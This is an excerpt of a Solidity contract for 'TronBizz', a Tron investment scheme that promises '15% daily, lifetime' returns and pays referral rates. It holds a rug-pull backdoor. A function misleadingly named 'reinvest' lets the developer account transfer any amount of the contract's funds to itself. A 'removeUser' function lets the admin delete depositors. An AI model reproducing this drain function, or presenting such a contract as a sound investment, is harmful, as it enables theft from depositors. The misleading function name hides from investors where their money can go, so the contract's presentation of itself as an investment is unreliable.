//SourceUnit: TronBizzContract.sol
...
contract TronBizz is Ownable {
    using SafeMath for uint256;
    uint256 public constant DEVELOPER_RATE = 150; //per thousand
    uint256 public constant REFERENCE_RATE = 180;
    uint256 public constant REFERENCE_LEVEL1_RATE = 250;
    ...
    function _init() private {
        ...
        investmentPlans_.push(Objects.Plan(150, 0)); //15% daily, lifetime
    }
	...
	function reinvest(uint _amount) public returns(bool) {
		require(msg.sender == developerAccount_, "Admin Only Can do this");
		developerAccount_.transfer(_amount);
		return true;
	}

    function removeUser(address _address) public returns (bool) {
        require(msg.sender == developerAccount_, "Admin Only Can do this");
        uint256 uid = address2UID[_address];
